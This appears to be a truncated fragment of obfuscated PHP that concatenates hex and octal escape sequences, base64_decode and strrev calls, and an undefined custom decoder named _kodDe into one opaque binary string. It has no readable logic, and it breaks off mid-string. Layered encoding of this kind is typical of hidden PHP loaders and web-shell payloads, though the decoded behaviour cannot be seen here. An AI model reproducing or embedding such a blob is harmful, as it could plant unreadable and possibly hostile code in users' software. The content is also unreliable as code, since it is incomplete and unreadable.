\x3d\x46\x20\x18\x8e\x0\x0\x10\xf2\x2c\x50\xdd\x52\xe1\x84\x10\xd4\x51\xa1\xe9\x44\x3f\x63\xd9\xe5\x18\x90\x43\xa9\xc1\x7a\x94\x5e\xf0\x80\xc6\x61\x9b"."\365\201\326\106\37\65\257\151\210\132\362\32\202\76\150\105\112\272\225\150\13\21\256\243\0\42\271\201\70\13\163\273\111\230\301\116\164\20\341\7\72\314\21\234\171".base64_decode('wG5CrSzMeVUQgWqBnLZ2NLBwM7N8gxmBoBDxBD0tIRYNdgBaDdMEC7AWTygM').base64_decode('ZtXa3sLpud8zB6BCgEKTCgruM8tcFXXlXdi+BQfxz+k0Bu0CuhdWOaRJi8tJ')."\31\152\21\22\61\123\152\226\362\252\260\227\331\376\210\77\320\204\343\310\311\210\67\33\347\342\204\324\51\1\276\70\314\371\142\203\36\114\14\327\45\200\241\22\66"."\x9a\x93\x5a\x3\x1d\x1e\xee\xb1\x42\xc8\xc0\x29\xc4\x56\x4f\xe2\x7e\x2c\xdc\x67\x76\x76\xd\x74\xb9\x0\x17\x60\x2c\xe0\x66\x2b\xd\x33\x25\xca\x5f\xd4\x43\x16\x90\xd8\x50\x90\xda"."\x1e\x7a\x56\x2e\x70\x90\x63\x21\x92\xd6\x92\xd4\xe4\x1c\x50\x3d\x1c\x8\x90\x65\x9a\x4b\x3\x88\x20\x92\xa\x40\xf0\xcc\xa5\xa9\xfd\xa\x36\x9c\x89\x74\x2d\xea\x3a\xad\xcb\xe9\xc2"."\266\102\220\53\351\162\360\41\105\274\163\301\101\32\12\131\14\235\42\310\31\3\151\35\114\226\204\360\326\304\221\351\344\207\310\120\323\11\10\110\164\106\55\133\123"."\357\354\105\255\340\157\123\170\221\27\374\365\203\37\177\30\254\232\312\12\200\175\347\367\315\362\56\202\377\360\214\162\6\110\154\126\140\255\340\153\135\4\376\5\124".strrev('»:`!”‰‡N0KmïÉ7;PÎh¾'."\n".'©ª€¢òü˜hÅëÃ¸oLØŞÕ¯‘d')."\307\225\107\42\156\243\235\240\15\263\45\56\53\35\123\125\112\16\12\117\250\236\54\270\227\206\10\102\24\342\2\322\235\266\42\2\363\255\102\342\115\301\100\173\233".base64_decode('EG/2zPG1NtGYu4KGKqizhwZfCIConiIjd/kixnEY8z4iO2vB7AZAvkFE4MUh')."\x97\x8f\xc9\xaf\x75\xb3\xcd\x6c\xf7\xf9\x1b\x44\xdb\x4e\x58\x10\x87\xc6\x22\xd2\x4d\xe\x8e\xb1\x74\x70\x34\x8e\xac\x3c\x69\x4\x82\x9c\x86\x11\xba\xd1\x8\x82\x1\x8d\x60\x0\xd0"."\30\2\27\215\40\327\62\64\202\46\112\43\120\354\360\266\322\74\40\152\2\61\221\312\217\111\256\122\233\222\373\231\235\322\264\170\124\60\67\206\224\330\205\275\202"."\100\313\163\40\213\311\354\142\317\166\77\207\356\215\4\101\37\253\311\111\202\271\44\274\350\23\256\172\334\270\4\140\66\121\31\360\333\265\240\16\61\303\13\50\312".strrev('Ò(ÄT«Ûò9ÜˆØıj	¢5;XCwç8ä·BQVCêtªÄ§Kiš¬3=b')."\46\354\20\263\146\7\371\325\371\264\254\312\206\60\205\340\301\257\360\117\27\51\113\57\54\210\271\122\251\203\34\260\276\100\304\17\216\215\210\50\63\372\2\344\226"."\303\25\25\355\142\43\334\274\326\45\163\225\77\123\317\13\276\152\220\372\37\130\106\17\267\242\143\27\57\50\57\37\205\205\5\270\251\132\15\274\40\203\251\170\147"."\22\346\11\46\122\153\132\354\303\307\256\233\47\46\163\365\76\166\111\115\265\12\125\0\162\113\5\361\242\126\216\223\172\260\25\211\366\214\56\24\263\126\107\63\0".strrev('É¤Q'."\r".'Ÿo&’ÍgÊ°¤Ì4éıû7Í€#…İƒQŸÇÂˆ'."\n".'yhÒ%')."\x55\xe7\x19\xe0\xc\x41\x61\x12\xdd\xea\x71\x78\x63\x57\x47\xb6\x8a\xa4\x25\x1f\x9b\xb8\x50\x8a\x27\xfa\xb9\xe7\x1c\x78\xa1\xc6\xdb\xec\xa6\x4c\x2a\x9f\xe4\xb0\x9a\xb3\x5f\xaf\x65"."\265\66\105\317\250\350\246\260\203\353\76\263\174\241\66\122\61\147\57\31\305\200\233\317\202\36\332\330\312\72\253\150\141\352\46\15\41\214\304\130\65\246\320\13\226"."\x14\xd5\x15\x74\x50\x11\xd5\x20\xcd\xea\x69\x8c\x53\xa3\x6c\x83\x33\x35\xad\x45\xce\xe\x85\xb5\x39\xaa\x42\xd0\xb4\x21\xd0\xd1\xea\xf\x50\x87\x20\xd4\x5b\x10\x8e\x25\xc9\xdb\x1a"."\x10\x77\x74\x17\x8d\x98\x34\xa0\xcb\xa4\xe7\xe\x7a\xa4\xc1\x6b\x24\xc1\x75\xdc\x28\x11\x7\xd0\x62\x72\x9c\xf4\x4\xeb\x9b\x1\x33\x1a\x69\xf4\x1\x1e\xdc\x3b\x37\xcc\x1b\x68\x6".strrev('Ú•ïø>;Vz­BîëKP)uÔ€_Ul°ƒ¸ˆä6Ù%¯Êä…âÍBÛ{U')."\5\227\112\373\330\205\105\353\325\223\202\254\103\35\211\16\377\275\303\240\302\31\152\120\15\51\305\377\327\112\334\271\27\352\11\125\22\50\224\255\16\102\25\254\144"."\114\126\65\105\262\271\35\73\40\213\100\122\150\6\247\147\40\70\217\114\337\10\133\50\35\174\230\122\143\156\144\132\103\170\201\151\350\256\321\211\200\103\370\213\205"."\x80\xbc\xb1\x10\x7d\xae\xc2\xc7\x80\x68\xef\x45\x3c\x2d\xf0\x1b\x79\xf\xfe\x99\x97\x89\x3b\xc1\xe0\xc9\xc3\x54\x5c\x31\x99\x85\x3b\xdc\x53\x1e\xb2\x4\x70\xdc\x82\xa9\x52\x86\x91".strrev('ƒ½½ öBD4'."\n".'Ìà„"wCÉ»˜ÃÃ˜Y…‚O'."\0".'‚Êx=@¯ÜŒûÁ£')."\x71\x64\xfa\x14\xf4\xd6\xcf\x63\x97\x6a\x2c\xb5\xd1\x33\xc7\x9e\x2\xb1\x3f\xec\x69\x2a\x9a\xcc\x24\x27\x98\x8e\x78\x93\x48\x30\x0\x5\x48\xaf\xbf\xd1\x56\x21\xd4\xcc\x9c\x2\x59".base64_decode('0yJ+X+usohnhQKRFqIITfWFviz3N2kLIC3cuj8/0B+qFbF+gEBKAIbIlYjkU').strrev(''."\r".' Ù#ìíX"Ja€&'."\n".'®uÜºËË‹]uÀpgXY_3'."\0".'jBâ!kº†\'')."\24\17\161\51\22\163\273\134\244\115\26\0\22\41\363\250\100\351\45\161\274\26\302\266\347\226\116\155\126\247\324\0\316\145\367\123\344\303\127\346\221\320\274\20\3".base64_decode('LsbCYvkWdMLFxActW2Hwt00sGlYyuaIFLfhoMXUSk1yqxrcB38FxLZaH5u0c').base64_decode('wPw8AUmEaeJvxQa/GiCniVN0UQdhKrIF8ajtaCAJfJsJBwhPHE9f2ec5M854')."\x57\xb8\x9\x3a\xdc\xe9\x9a\xcf\x6\xa8\xea\x82\xc7\x9b\x98\x96\x8d\xab\x82\x99\x9d\x4c\x55\x6b\xa2\xf9\x58\x2f\x35\xfa\x41\xf4\xcb\x70\xe\xa8\x14\x4\x63\x98\x71\x3c\x79\x9d\x8d"."\xc8\xc8\xf\x44\x44\x7c\x9c\xef\x73\x1a\x6a\x32\xeb\x94\xd3\x49\xd\x70\x3\xa9\xc\x4d\x95\x7b\x2d\xf9\xdc\xfb\x52\x4e\x4b\xab\xd4\x9\x46\x9f\x13\x74\x21\xe4\xe1\xc2\xa0\x71\x4a"."\xf7\xe1\x13\x11\x73\x54\x5\x23\x6\x8b\x89\x78\x81\xa8\x22\xe5\x52\xb9\x91\xad\xc0\xea\x84\xd0\x90\x6b\xa4\x6a\xe2\x13\xae\x11\x30\x61\x71\x8e\xba\xd4\xcb\x17\x37\xaf\x84\xc7\x38".strrev('#ÄŠ›AáF§	‰Ë1PÏeé–0ş^™¥©‚0Šqeb¤˜{‰£†ƒr')."\310\233\71\104\337\213\211\141\312\314\41\170\252\25\60\142\320\326\121\364\210\351\351\10\125\73\233\133\74\365\116\100\327\306\123\125\34\160\322\164\205\301\121\103\61"."\x47\x1e\x30\xaa\x29\xbb\x8b\x53\xc6\x4d\x92\x52\x0\xd4\x4\x25\xa\xdd\x50\x8d\xb1\xfa\x5d\xc3\x89\xd8\x8b\x12\x10\xb8\xe2\xf0\xa9\x90\x2e\x2\x4e\xb5\xa1\xa\x4e\xe4\xac\x39\x8e"."\143\357\34\364\175\73\45\263\1\303\151\340\120\261\176\347\26\355\167\156\261\176\347\332\372\235\133\330\57\116\262\241\244\234\313\325\143\77\217\42\355\260\44\305\304"."\x8\xa5\xaf\x9\xf8\xd8\x29\x3e\xa8\x12\xd1\x12\xeb\xd4\xb8\x40\x76\x3\xe6\xf4\xe2\xac\xbc\xc1\x43\xc\xed\x13\xc2\x86\xb0\x34\xe7\x22\x84\x88\x54\x77\xc3\x47\x15\x1c\x4c\xcb\x86"."\11\31\336\377\203\263\64\150\125\335\302\270\160\306\120\271\65\303\160\103\307\60\210\215\144\57\367\201\20\275\126\263\316\11\277\237\12\102\37\361\122\301\374\166\61"."\xaf\x5e\xdc\xf5\x17\xbe\xd\xc1\x61\x2f\x33\x9b\x6\xdc\xb0\x27\xa9\x84\x14\x48\xc8\x8\x54\xbc\x83\x39\xcd\x50\x44\xa7\x73\x71\x5\x39\x2a\x62\x76\x71\x82\xcb\xb6\x8c\x3c\x8\x49"."\xd\x55\x68\x10\x9c\xb7\x51\xbf\x66\xa2\x97\x18\x8\x30\x67\xc6\xe2\x35\x72\xd0\x9\xa6\x6e\x73\x76\x66\x28\x4a\x2f\x95\x6f\x4\xce\x98\xc9\xa4\x6d\xcc\x89\x99\x7d\x3a\xaa\xc5\x60"."\235\323\77\235\373\272\103\367\346\316\242\11\116\301\346\24\323\5\301\13\42\30\41\351\4\16\230\354\344\24\202\22\225\150\361\317\374\142\363\167\352\334\343\34\130"."\125\354\237\164\226\62\104\175\267\331\366\202\315\335\133\127\123\127\113\127\130\4\230\251\313\211\4\30\266\340\101\312\62\226\237\163\110\107\256\204\116\53\352\202\216".base64_decode('ZCKm160jNQPHAL1aZZoGDG+Rh+IimDsbphPcTXBdhVxecJUtYgs8pZlyAJRo')."\xb1\x5f\x40\x4a\x30\x90\xbf\x3e\xe2\xd8\x93\x39\xd0\x3\xe0\xca\xce\xd4\xe2\xe4\xc8\x5b\x58\x2\xf0\xb0\xa4\xa6\x64\x4c\x19\xf8\x2d\x2f\x71\x94\x40\x86\x9\xc5\xe1\xca\xc1\x4\x34"._kodDe('MIB8H4gWUzw+n3p3dY8ADs6tef48pEckPM87myAv/Nz13+rf3O/c+zDo2H1Oyg==')."\63\257\375\4\30\214\0\242\107\25\41\42\42\351\45\104\235\254\202\230\323\314\106\102\211\162\113\3\151\176\256\323\323\62\337\311\135\326\115\257\33\314\244\45\42"."\370\324\226\126\271\52\113\45\352\330\271\266\264\75\334\350\234\122\132\67\343\360\351\365\350\226\335\124\132\340\65\71\164\7\210\145\322\31\344\56\154\72\334\134\54"."\342\266\306\366\125\27\347\313\31\171\130\313\202\203\16\320\247\214\53\106\200\331\316\150\30\367\42\230\125\314\1\115\47\117\10\204\274\216\257\254\26\361\230\240\210"."\101\366\34\266\21\257\201\227\143\164\372\355\271\241\174\326\11\45\143\147\110\364\327\142\163\127\132\151\55\17\145\133\153\171\221\60\306\70\311\310\360\40\166\57\133"."\x23\x89\x3e\x87\x5\x1f\x6d\x4e\xc8\x11\xe0\x9d\x48\x2f\x54\x48\x1a\xa4\x99\x34\x49\x15\x3d\xde\x51\xbc\x86\x4\x31\x62\x25\x88\xa7\xdb\xc6\xb\x41\xed\x4\x5c\x16\xc4\x7f\xb0\xa9"."\xc0\xe1\x6b\x2a\xc5\x8a\x58\x1d\xdb\xda\xdd\xdd\xda\xa1\x80\xaa\xc0\xc5\x75\x8a\x7e\x74\x7\x1\x43\xd\xb3\xa1\x23\x4e\x27\x5c\x5f\x27\x75\x40\x53\x98\xc3\x37\x75\xd1\xa1\xc6\x8"."\252\24\53\322\236\127\343\366\56\321\253\215\63\237\247\35\26\155\124\144\367\151\1\64\11\37\153\317\302\170\3\31\335\311\170\155\73\357\56\134\132\26\272\262\4"."\x9b\x57\x1a\x3f\xa1\x66\xe2\x54\xf0\x7\xa7\x9c\x46\x1f\x9d\xf2\x39\xb3\x96\x5\xa9\xab\xcb\x51\xee\x4\xa5\x3\xdc\xb\x2e\x9d\x1b\x5c\x70\x8b\x7f\x4f\x21\x99\x83\x91\xed\x70\x4a"."\100\54\345\370\150\55\76\224\311\104\261\34\51\170\65\105\267\253\170\47\301\127\330\10\163\12\133\204\222\306\25\142\76\240\146\311\341\51\134\105\260\5\111\322\200"."\316\312\313\174\213\104\323\275\174\46\121\250\172\107\60\274\27\14\124\343\114\26\72\146\205\253\314\130\52\237\355\255\25\62\45\123\323\244\214\234\35\42\354\377\130"."\243\146\254\61\15\166\124\73\326\125\235\60\100\4\147\160\147\137\360\34\341\236\172\260\215\77\311\301\167\311\56\350\173\331\5\17\251\140\236\224\152\113\347\231\267"."\335\34\12\223\21\266\371\333\233\174\255\302\303\261\220\20\251\157\150\215\170\332\332\212\146\220\225\300\267\130\360\215\305\325\103\135\313\307\50\126\115\127\63\111\51"."\6\125\107\153\113\140\152\211\144\350\61\352\362\254\304\115\350\50\52\300\5\246\351\52\251\122\12\253\110\11\200\46\116\24\302\331\245\63\246\273\325\31\14\330\334".base64_decode('fYGucQ1Yl3s0FJ/c8E02expcXfFdCKU2cmcFkjRdljAca0vhg1miVEqB85hp').base64_decode('ncywV26ljxPT3bKYCXdWUKPMLxOh+tktcdHrb0/M5je3Xs7OKawCG3fFimW5')."\221\114\357\26\174\66\23\207\51\242\212\240\305\227\220\365\155\200\135\247\27\101\20\27\363\124\237\223\143\275\20\273\370\121\200\13\272\110\106\33\24\126\160\206\305"."\xf3\xab\x29\xbc\x82\x81\x29\x80\x4e\xa1\xb0\xaa\x73\x4f\xd6\xb\x17\xe2\x86\xe0\xe9\xbf\x78\x71\x61\x1a\xd1\xa3\xb1\x67\x79\x72\xaa\x3d\x9\x62\x91\x3d\xd\xca\xdb\x3c\xd\x9c\x69"."\xd6\x6e\x30\x6\x8b\x85\x78\xa\x2d\xe3\x6f\x6d\xe2\x15\xb0\x30\xc2\xe3\x20\xb3\x93\xaa\xa8\xa1\x58\x57\x67\xa9\xab\x62\xf1\x62\xb7\x4a\x1f\x9e\xbb\x4a\xac\x75\x5d\xac\x34\x8e\x77"."\xb9\xac\xe5\xc1\xc8\x9\xa8\x59\x41\x92\x60\x2f\x89\x79\xc7\x33\xc8\xc6\x3b\xdc\x5d\xc1\x35\xeb\xd9\x3\xb3\x4\x5f\x9d\x6b\x6b\x67\x74\xb2\x7\x85\x6e\x9a\x47\x19\x40\xb5\x6a\xa"."\x5d\xee\xe1\x94\x33\xdc\xc1\x82\xf5\xad\x9c\xc5\x65\x8\x8e\x69\x89\xb\x5d\x56\x7b\xac\xee\xde\xea\xfa\x99\xa3\x65\xc\x45\x31\xec\xc9\xe5\xc4\x28\xfd\xec\xd\xba\x0\x4f\xab\x51"."\x37\xdb\xe9\xf8\x52\xdc\x15\xe3\x6a\xe9\xb4\x8\xa2\x33\xb6\x74\xf8\x3a\x6c\xcb\x80\x9a\xbd\x28\xb9\x1f\x10\x42\xc0\x71\xf5\xd8\xd3\x41\x5b\x2c\x91\x5\xa6\x1b\x31\x5d\xcd\x99\x16"."\32\205\77\244\122\202\134\143\367\310\375\62\56\122\42\321\57\64\224\40\107\240\45\200\46\341\34\102\14\370\120\246\103\342\43\351\112\272\266\4\15\327\110\51\12"."\xa8\x8f\xc8\x4b\xb1\x4e\x40\xc5\x12\x89\x52\xc6\x8c\xcc\x20\xa6\x9b\x1a\x38\xf4\x98\x36\x36\xf1\x46\xdf\x1e\x24\xca\xa5\x9e\x56\xf2\xcc\x40\xd8\xa9\xd1\x67\xe2\xdf\x31\xa3\x29\xa2"."\240\317\37\244\25\35\153\320\41\212\203\236\230\22\374\2\213\70\307\157\13\6\302\201\172\352\146\274\330\115\127\65\345\135\15\254\351\317\145\34\252\335\74\313\73"."\317\132\202\161\3\156\222\102\226\137\317\147\263\354\15\37\262\207\354\310\302\317\66\241\124\336\344\207\35\364\23\32\206\146\67\6\111\26\334\10\101\47\106\112\234".strrev('*E'."\n".'F†¢é"3Ø¬¬éYY_Ò5Òà\\\\°vèöÀ£¿R/I¡Ì(^^')."\53\153\320\37\234\201\56\127\11\100\255\71\140\377\122\102\103\12\14\50\12\31\20\41\363\31\65\233\247\334\120\75\124\163\227\340\310\152\153\311\116\63\331\4\0"."\x30\x91\xd5\x50\xd\xa5\x2\xd3\x4\x29\x6e\x9a\x84\x9e\xaf\x48\x4c\xb1\x83\x81\xbd\xb\x92\xf5\xa1\x27\x5\xdc\xf6\x34\xc\xd8\x12\xb0\x56\x8\x2c\x14\xcc\x54\x5b\x1\x14\xe3\x58".strrev('q34±@)³±*nL0Ë(+ÒÉ5ñDÅx(¹ŠÔœ›'."\r".'1¼‰ÆÍáÆ'."\0".'').base64_decode('g9FWVhR7Gcba/GS2RRAppQ1E+CEHo2ewGJo8lEsoyrBpEghQ8kdRhL40k4dr')."\x64\x34\xd6\xab\xa6\x2d\x16\x45\x11\xa1\x6d\xd1\x45\x2e\xa0\x32\x90\x7b\xa5\xeb\x87\xaf\xcb\x49\x7\x90\xf1\x71\xf1\xa5\x47\x3e\x4\xd1\x37\x5a\xb0\x2e\x4b\xcd\xe1\x2\xf0\x74\x8d".base64_decode('2/gUfNCIxgR7M3qZHPovyhI0xcvMZpGgWc+cJwkN2LNsdTxx4Vs7BveaVM8c')."\244\211\256\224\360\43\255\360\150\157\20\17\236\374\125\226\266\321\57\110\10\256\234\256\45\1\310\15\161\256\40\275\255\170\62\53\136\130\262\110\41\66\41\261\234"."\230\10\65\202\350\147\137\10\366\160\233\42\231\177\220\112\50\312\357\236\204\104\253\316\216\220\121\317\74\220\213\211\120\342\20\337\341\221\331\241\265\15\50\312\130"."\123\330\310\176\6\127\250\10\152\222\117\4\11\366\140\244\30\127\121\202\327\3\342\25\246\252\321\47\176\10\15\376\336\146\115\57\300\62\262\25\50\345\303\173\305"."\x9a\xb7\x7d\xe9\xa5\x34\xb0\x8a\x96\x82\x93\x67\x37\x51\xe2\x5\x2d\x9c\x78\x44\x94\xb2\xe1\x76\x69\x66\x9f\xb3\x29\x82\x2e\x56\x94\x28\x58\x7b\x74\x7d\xb\x1b\xa8\x61\xf4\x41\x88"."\x1\x11\x83\x72\x22\x71\x3a\xde\xbe\xbc\x42\xb9\x27\x81\x98\x48\x26\x27\x25\x70\x4c\x50\x1\x36\xa5\x6b\xa6\x29\x5a\x8c\x7a\xa8\xf2\x11\x8c\xf8\xc5\xb3\x33\x8c\xab\x38\x67\xf0\x7e"."\x2c\xef\x39\x82\x67\x42\x56\x14\x10\x6d\xda\xbb\x4c\xa9\x35\xd2\x8d\x71\x21\xc7\xa9\x9c\xb9\xb7\x45\xed\xfa\x33\x88\x3a\x9b\x94\xfe\x52\x97\x8e\x59\xe6\x79\x1e\x2e\x67\x48\x50\x71".base64_decode('KNIDqcSqkENDV2JAmoGET7BEzJpBJSlG/RqTdOH7gVKkCWh/LCAnxAIgg+VF')."\333\146\301\43\44\210\11\156\74\205\223\334\131\45\61\26\40\202\133\306\221\161\102\6\52\137\214\33\260\335\267\10\32\213\110\304\14\345\243\354\252\333\166\102\123"."\175\110\111\74\45\251\126\43\154\0\331\346\302\31\30\142\36\150\26\372\240\343\63\23\253\240\76\13\252\340\74\170\262\161\365\107\61\307\0\162\11\4\325\276\163".base64_decode('inSFsgSIxujBSx7U5nEgkYwhhapIOavGOyeQW1VRM5IcjQS+kI8U0AByu5SC').base64_decode('ES0oUo6X0YSv2yC7WG6kiAx92Xoii2AW04UTR2EaUsi6ViQr/FEXK07BAu3F')."\362\61\204\140\166\203\105\203\314\126\0\354\14\153\76\161\355\231\261\174\246\20\340\201\105\73\301\326\10\161\352\52\272\57\105\265\370\74\270\62\36\110\322\260\3"."\x51\x1\x30\xfc\x71\x1a\x9b\x13\x53\x2d\x42\x46\x97\x78\x72\x58\x63\x89\x85\xf\xdc\x2e\xa6\x45\x49\x6c\x45\xc8\x67\x64\xca\xca\xa1\xad\x88\xe5\x2e\xa1\x65\x88\xe9\xfc\x83\x95\xec"."\205\347\43\123\160\63\304\10\315\145\310\151\130\42\130\43\304\122\233\45\261\122\3\12\61\373\140\62\160\133\163\233\233\45\315\244\140\142\326\233\104\200\342\37\46"."\x21\x6a\x52\xc4\xee\x62\x0\xc0\x5d\x1b\x20\x1b\xac\xbe\x86\x29\xc9\xd0\xcf\x1e\xe\x64\xd4\x98\xe4\xf\x34\xf9\xea\x3d\xfe\x6\x5f\x68\x96\x94\x54\x4c\xe1\x9b\x9d\x48\xf1\xd9\xba"."\335\321\225\20\136\34\212\371\121\346\261\26\6\235\121\300\26\72\343\214\35\66\70\343\53\350\316\10\356\333\255\315\142\34\125\364\202\26\1\33\235\261\22\4\124".base64_decode('B150FSmd5nc9QuGcrhSWH1LQtwv5iIUK+SKjIeWL9wC2iLU0OKyV7L4Gr2b7')."\125\103\345\304\201\326\30\22\133\347\127\171\72\363\263\54\0\75\56\272\122\346\300\306\275\210\326\376\166\331\123\54\41\252\107\342\145\22\35\175\344\350\305\64\371".base64_decode('Hgd3co2igvvxnC6rhiIkYD/YFeU0JjgFIbUjuA5OC8Jv+f2vG1fj3MGHbWhq')."\x9c\x3e\x6f\x33\xed\x76\xec\x6c\xb6\x5e\xfc\xa4\x8\x1d\x42\x81\x8f\xf4\xff\xea\x6d\xdd\x21\x58\x87\x23\xab\x76\xaa\x73\x88\x3e\x68\x4a\x1e\x1a\x88\x90\xe5\xb\x44\xb0\x49\x37\x8e"."\272\355\172\211\310\277\153\66\246\17\345\304\327\21\167\234\176\315\206\112\156\320\137\211\227\136\215\302\210\360\55\20\55\36\113\153\371\70\257\114\72\203\243\301\2".base64_decode('DBCn4KMBZXSJOG2A/U5WxfJWaHMrb1eNs3zfr6AP6K933+2AehKX4lkBqVaq')."\x44\x37\x45\x5c\x9\x4a\x9a\x4e\xed\x70\x78\x17\xc8\x67\x83\x37\x93\x33\x2d\x32\x1a\x51\x97\xc5\x49\x88\x17\xe1\x72\xc\xd4\xbc\xd0\x32\x43\x5\x9\x16\x1\xdf\x4f\x87\xc1\x74\xb1"."\xa0\x1b\xe3\x6c\x42\x13\x67\x8d\xc8\x21\x38\x55\xf0\x47\x2d\xa0\x7a\x32\xe\x61\x21\xd0\x1\xd8\x72\xc5\x2c\x74\xa5\x8e\xdb\xd9\x67\xa3\x86\xfd\x40\xe1\xcc\xd\x20\x11\xa1\x94\x36".base64_decode('YP3oBUwRWBkLibb2BXME1EbGl4IpC/2F9/UWH/ZC62PxTxf5pTTf3jTe5WQo')."\xe5\x6c\xa9\xeb\x2d\x9f\x17\x16\x12\x5a\x14\x2e\x97\xa1\x5a\xf0\xd9\x5b\xce\x32\x22\x46\x9c\xc8\xb3\x8f\x5b\xf0\xcd\x46\xf3\x4\xc\x42\x9f\x51\x68\xd8\x47\x55\x5b\xb2\x64\xf5\x6a".base64_decode('zZ2F8/PI6uCZPXQxpSiknCa66w5rYTnpwJwQpEc8NnNIDItaf2jSIJPekMQZ')."\x6\xcc\x10\xa\xd0\xef\x50\xc4\x1d\xe8\x23\x9\x98\x2a\xd9\x3f\xc4\x21\x6c\x17\x46\xea\xc4\xda\xc9\xb4\x16\x95\xd3\x41\xac\x4d\x63\xd1\x4c\xd7\x81\x14\xc3\x74\xe5\x2c\xc5\x70\x92"."\133\316\345\366\171\31\217\23\311\305\174\76\353\303\266\115\226\124\135\220\222\104\275\113\374\4\301\315\72\110\161\320\133\33\176\163\40\323\26\233\244\357\76\350\7"."\xca\x51\x8d\xc2\x47\xed\xdc\x85\xef\x44\x50\xdb\x87\xec\x76\x51\x2d\x8e\x3c\xdf\xb9\x44\x31\x86\x14\x90\xa6\x4b\x7c\x81\x2d\x1b\x14\x22\x4\xdc\xf5\x28\x80\x76\xbd\xc8\xf6\xfe\x4c"."\52\303\103\353\247\132\60\302\242\237\6\45\301\144\0\30\347\22\242\150\334\311\337\212\355\237\207\240\335\260\157\135\70\360\314\370\347\206\360\227\55\34\354\53\26"."\xe\xfc\x1\xb\x7\xf9\x76\x85\x83\x9b\xe7\xfc\xdc\xd7\x5e\xf8\xb7\xaa\xac\x1f\xb8\x82\x63\x66\x7a\x64\x5\xcc\xb8\x9d\xf\x67\xa0\xb2\x55\x8\xda\x1\x17\xd6\xa\xef\xd5\xf8\xeb".base64_decode('WDaf4Q+SIGKVSwomLMwwr6cd6G3QQX2Z2MDBZyWuTBEY/vc2sDohEjbiVqpT')."\63\75\252\323\367\26\173\61\325\202\165\100\304\347\332\353\330\317\123\201\313\374\171\231\370\370\11\23\247\212\102\75\137\37\376\216\101\74\277\21\177\133\325\370\207".base64_decode('HOB84SWhc0guqY8pcfuiTKvCZ+G3ZgQUtZLk/91W4CwyLiooYhZ+SKsAJAgr').base64_decode('BSUF4UCzvUJr8HHY4IPFRxj/1oy1L/xlpCLz4N0KWwN/xkRLQ2EzA686TV22')."\x4a\x4d\xc5\x84\x3\x4\x9\x2a\x89\xa8\xe8\x4b\x6c\x8a\x7d\xec\x8\x30\xe4\x5a\x81\x67\xb\xd2\x83\xd8\xa2\xa9\xd9\xef\x44\x60\x75\x78\x50\xa1\x2b\xb9\x40\x96\x3a\x93\x84\x76\x88"._kodDe('L4Jrzux/Bff5tUfpzzT33VWMLQEBVspbT+DOiOlSYHqVMviIPUltHPVfmZV+hw==').base64_decode('AbTAOCrIZta52poH1Xgb3Q5pX4UKuTDhszfcMYPAcsHa1ARqH6ItpVb8Ux7I')."\222\205\137\115\243\275\152\331\267\202\17\67\321\60\4\65\44\156\203\302\246\321\155\11\31\57\331\270\350\313\350\110\161\303\323\304\314\177\144\101\135\4\202\116\370"."\224\223\46\206\255\126\265\1\352\215\13\60\111\26\261\13\304\33\154\137\373\102\304\307\376\11\60\72\177\264\317\71\115\23\154\312\54\334\77\373\346\205\105\32\60"."\354\37\177\1\354\224\350\272\16\104\31\206\223\303\223\120\75\244\231\213\173\163\330\77\0\227\23\14\150\155\137\211\24\56\56\255\337\177\114\211\303\202\56\4\154"."\333\232\32\365\101\33\111\374\232\202\13\140\137\147\70\114\71\361\377\347\17\302\375\377\374\16\34\123\16\157\42\154\55\31\43\174\343\141\2\72\276\324\264\215\336".base64_decode('ejAeJuYSvHRYYiTCtxk8cVy2D2C6mEIidTRB/U/I9NFEhh+9KbikpB+LAnjY')."\313\276\145\124\54\122\370\45\77\13\312\121\56\223\17\63\253\306\172\213\74\302\101\300\373\255\116\377\4\336\240\240\30\247\112\200\205\240\256\65\334\64\24\203\302"."\25\144\40\51\61\24\215\305\2\71\52\206\225\23\372\333\175\72\45\32\310\372\224\320\16\221\136\130\222\12\250\114\330\162\366\131\22\105\360\360\57\126\272\254\37"."\140\44\65\132\154\237\352\301\205\54\36\41\55\67\312\205\157\262\205\265\331\26\26\253\100\5\115\353\275\14\373\352\137\245\375\63\200\125\316\302\316\260\176\64\274"."\105\10\102\71\237\42\44\172\164\100\217\202\105\352\340\315\30\342\145\366\201\376\305\267\36\373\146\243\40\376\202\220\70\137\272\205\333\164\15\61\140\326\124\166\227"."\x21\xe8\xc3\x9\x9f\xa0\x2b\xf8\x2c\x96\xed\xf2\x1e\x8\x45\xfc\x35\x4b\xd5\x90\xf3\x4e\x32\xed\x50\x7b\x4b\x19\x52\xf1\x27\x98\xa\x78\x7a\xe1\x53\xaf\x66\x26\x87\x6f\xbc\xc8\xa0"."\xb1\x4d\x8d\xe5\x7e\xc9\x10\xfd\xf1\x5a\x4d\x6f\x4\xdd\x55\x6b\x6\x54\x36\xb6\xee\x94\x19\xc5\x8a\xc5\x34\xdd\x10\x8a\xb1\xf4\x62\x65\xe1\x97\xc7\x4c\xb\x34\xb9\x47\x55\xbb\x27".base64_decode('VSQAY5nWItqSp0MxSXhZA0xt3KoViTJRMnXXRL//y9+GrE9zzK1lAaXKq34h').base64_decode('G9WiDj/AL7Qw8nHbapSNb7Q9/bJJH7jstdotEoTwkBdDuOMtfKvhT0jCkU+r').base64_decode('QRGE01pbukD8ObWT+/nzDOd543H2MUlLUfYxeZYKUvh3JyGHIxgtcm1YZcD+')."\175\63\227\150\350\150\51\130\230\312\215\32\355\363\102\173\301\342\110\324\45\132\103\62\154\341\111\330\153\56\323\72\21\4\7\250\256\315\325\121\360\30\231\130\314".base64_decode('u7TaXrJibDFAGaQc77Sk2kQheMlAz2dbliF+ANP68CbK6cLaKmm/0Jz4KLfP')."\xa\xa1\xe2\x9d\x70\x74\xb3\x82\x58\xb0\x53\xe5\x19\xf4\x14\x12\x5b\xb1\x50\x31\x36\x31\x52\x32\x28\x66\x5a\x86\x63\x5f\x5a\xc4\xc5\x73\xbc\xc4\x89\x19\x74\x8f\xe9\xa2\xf7\xc2\x85"."\345\25\333\350\305\12\366\231\341\32\306\200\152\306\122\205\351\172\1\334\110\133\305\207\144\357\230\202\315\56\123\361\106\4\151\246\340\361\76\254\25\251\203\107\124"."\264\32\316\102\137\142\146\374\237\245\56\236\145\321\272\70\13\326\55\310\246\225\205\313\10\241\236\51\347\215\175\114\257\20\170\104\56\217\27\231\260\115\172\305\105"."\367\5\317\242\205\13\273\43\110\145\57\215\4\371\342\243\340\362\267\355\201\264\330\50\212\26\336\347\50\212\174\135\226\370\255\52\102\47\151\116\21\312\310\137\323".base64_decode('C2kwzyvyto/bhOer6DylSLaoKFBclSBYdHcb1jd+W7oIGK4